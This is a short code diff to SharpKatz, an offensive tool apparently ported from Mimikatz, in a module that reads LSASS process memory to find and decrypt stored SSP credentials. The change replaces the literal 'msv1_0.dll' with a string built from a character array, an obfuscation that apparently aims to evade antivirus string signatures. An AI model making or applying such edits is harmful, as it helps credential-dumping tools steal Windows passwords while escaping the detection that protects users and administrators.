@@ -42,7 +42,8 @@ namespace SharpKatz.Module
             IntPtr llCurrent;
             string passDecrypted = "";
             
-            sspCredentialListAddr = Utility.GetListAdress(hLsass, msvMem, "msv1_0.dll", max_search_size, oshelper.CREDENTIALLISTOFFSET, oshelper.SspCredentialListSign);
+            string sMsv = new string(new char[] { 'm','s','v','1','_','0','.','d','l','l' });
+            sspCredentialListAddr = Utility.GetListAdress(hLsass, msvMem, sMsv, max_search_size, oshelper.CREDENTIALLISTOFFSET, oshelper.SspCredentialListSign);
 
             //Console.WriteLine("[*] Ssp  SspCredentialList found at address {0:X}", sspCredentialListAddr.ToInt64());
 
